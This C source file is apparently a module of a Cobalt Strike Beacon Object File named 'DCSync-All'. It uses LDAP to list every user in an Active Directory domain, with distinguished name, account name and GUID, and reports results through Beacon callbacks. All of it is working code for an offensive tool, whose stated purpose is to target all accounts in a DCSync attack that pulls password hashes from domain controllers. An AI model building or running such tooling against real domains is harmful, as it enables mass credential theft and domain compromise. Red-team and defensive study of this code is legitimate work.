// LDAP utilities for enumerating all users in DCSync-All BOF

#include <windows.h>
#include "../_include/ldap_common.h"

// Import required MSVCRT functions (if not already imported)
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void* __cdecl MSVCRT$realloc(void* ptr, size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void* ptr);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void* dest, const void* src, size_t count);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void* dest, int c, size_t count);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char* str);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char* dest, const char* src);

// Structure to hold user information
typedef struct _USER_INFO {
    char* distinguishedName;
    char* samAccountName;
    GUID objectGuid;
} USER_INFO;

// Enumerate all user objects in the domain
// Returns array of USER_INFO structures and sets userCount
// Caller must free the array and strings within each structure
USER_INFO* EnumerateAllUsers(LDAP* ld, const char* searchBase, int* userCount) {
    if (!ld || !searchBase || !userCount) return NULL;
    
    *userCount = 0;
    
    LDAPMessage* searchResult = NULL;
    LDAPMessage* entry = NULL;
    char* filter = "(|(objectClass=user))";
    char* attrs[] = { "distinguishedName", "sAMAccountName", "objectGUID", NULL };
    
    // Search for all user objects
    ULONG result = WLDAP32$ldap_search_s(
        ld,
        (char*)searchBase,
        LDAP_SCOPE_SUBTREE,
        filter,
        attrs,
        0,
        &searchResult
    );
    
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate users: 0x%x", result);
        return NULL;
    }
    
    // Count entries
    int count = WLDAP32$ldap_count_entries(ld, searchResult);
    if (count <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No users found in domain");
        WLDAP32$ldap_msgfree(searchResult);
        return NULL;
    }
    
    // Allocate array for user info
    USER_INFO* users = (USER_INFO*)MSVCRT$malloc(count * sizeof(USER_INFO));
    if (!users) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for user list");
        WLDAP32$ldap_msgfree(searchResult);
        return NULL;
    }
    MSVCRT$memset(users, 0, count * sizeof(USER_INFO));
    
    // Iterate through entries
    int index = 0;
    entry = WLDAP32$ldap_first_entry(ld, searchResult);
    
    while (entry && index < count) {
        // Get distinguishedName
        char** dnValues = WLDAP32$ldap_get_values(ld, entry, "distinguishedName");
        if (dnValues && dnValues[0]) {
            size_t len = MSVCRT$strlen(dnValues[0]) + 1;
            users[index].distinguishedName = (char*)MSVCRT$malloc(len);
            if (users[index].distinguishedName) {
                MSVCRT$strcpy(users[index].distinguishedName, dnValues[0]);
            }
            WLDAP32$ldap_value_free(dnValues);
        }
        
        // Get sAMAccountName
        char** samValues = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
        if (samValues && samValues[0]) {
            size_t len = MSVCRT$strlen(samValues[0]) + 1;
            users[index].samAccountName = (char*)MSVCRT$malloc(len);
            if (users[index].samAccountName) {
                MSVCRT$strcpy(users[index].samAccountName, samValues[0]);
            }
            WLDAP32$ldap_value_free(samValues);
        }
        
        // Get objectGUID
        struct berval** guidValues = WLDAP32$ldap_get_values_len(ld, entry, "objectGUID");
        if (guidValues && guidValues[0] && guidValues[0]->bv_len == sizeof(GUID)) {
            MSVCRT$memcpy(&users[index].objectGuid, guidValues[0]->bv_val, sizeof(GUID));
            WLDAP32$ldap_value_free_len(guidValues);
        }
        
        // Only count users that have all required fields
        if (users[index].distinguishedName && users[index].samAccountName) {
            index++;
        } else {
            // Free incomplete entry
            if (users[index].distinguishedName) MSVCRT$free(users[index].distinguishedName);
            if (users[index].samAccountName) MSVCRT$free(users[index].samAccountName);
            MSVCRT$memset(&users[index], 0, sizeof(USER_INFO));
        }
        
        entry = WLDAP32$ldap_next_entry(ld, entry);
    }
    
    WLDAP32$ldap_msgfree(searchResult);
    
    *userCount = index;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully enumerated %d users", index);
    
    return users;
}

// Free user info array
void FreeUserInfoArray(USER_INFO* users, int userCount) {
    if (!users) return;
    
    for (int i = 0; i < userCount; i++) {
        if (users[i].distinguishedName) {
            MSVCRT$free(users[i].distinguishedName);
        }
        if (users[i].samAccountName) {
            MSVCRT$free(users[i].samAccountName);
        }
    }
    
    MSVCRT$free(users);
}
